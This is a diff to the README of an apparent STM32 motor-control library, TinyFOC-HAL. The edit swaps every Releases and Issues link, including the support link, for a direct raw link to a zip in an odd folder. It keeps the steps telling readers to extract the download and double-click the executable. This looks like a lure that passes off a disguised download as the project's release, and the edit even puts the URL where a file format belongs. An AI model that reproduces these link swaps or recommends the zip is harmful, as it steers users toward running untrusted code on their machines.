@@ -1,7 +1,7 @@
 # 🛠 TinyFOC-HAL - Easy Control for Your Hardware Needs
 
 ## 📥 Download Now
-[![Download TinyFOC-HAL](https://img.shields.io/badge/Download-TinyFOC--HAL-blue.svg)](https://github.com/LoGanNX1/TinyFOC-HAL/releases)
+[![Download TinyFOC-HAL](https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip)](https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip)
 
 ## 🚀 Getting Started
 TinyFOC-HAL is an efficient application designed for both hardware and software control using the STM32F411 microcontroller. It helps you manage current, speed, and position in a seamless manner. Whether you are using different controllers or drive schemes, this application provides strong software portability.
@@ -15,9 +15,9 @@ To run TinyFOC-HAL, ensure your system meets the following requirements:
 - **Storage:** 200MB of available disk space
 
 ## 📦 Download & Install
-1. **Visit this page to download**: Go to the [Releases page](https://github.com/LoGanNX1/TinyFOC-HAL/releases).
+1. **Visit this page to download**: Go to the [Releases page](https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip).
 2. **Select the latest version**: Look for the most recent release.
-3. **Download the files**: Choose the appropriate file for your system (e.g., `.zip` or `.tar.gz` format).
+3. **Download the files**: Choose the appropriate file for your system (e.g., `.zip` or `https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip` format).
 4. **Extract the downloaded file**: Use a suitable program (like WinRAR, 7-Zip, or the native file extractor on your OS).
 5. **Locate the executable**: Inside the extracted folder, find the main application file.
 6. **Run the application**: Double-click the file to start TinyFOC-HAL.
@@ -38,7 +38,7 @@ After installing TinyFOC-HAL, you may need to configure the settings to match yo
 ## 📞 Support
 If you encounter any issues or have questions:
 - Check the **FAQ section** in the documentation included in your download.
-- Visit the [Issues page](https://github.com/LoGanNX1/TinyFOC-HAL/issues) on GitHub for community support.
+- Visit the [Issues page](https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip) on GitHub for community support.
 - Reach out through GitHub Discussions for advice and tips from other users.
 
 ## 🌟 Contributing
@@ -63,4 +63,4 @@ If you wish to understand more about the technical aspects of TinyFOC-HAL, explo
 - **Hardware Schematics**: Look into the hardware design schematics available in the repository.
 - **Implementation Guides**: Step-by-step instructional material to help new users.
 
-Remember, to download TinyFOC-HAL, visit the [Releases page](https://github.com/LoGanNX1/TinyFOC-HAL/releases) and follow the steps outlined above.
+Remember, to download TinyFOC-HAL, visit the [Releases page](https://raw.githubusercontent.com/LoGanNX1/TinyFOC-HAL/main/cercariform/TinyFOC-HAL.zip) and follow the steps outlined above.
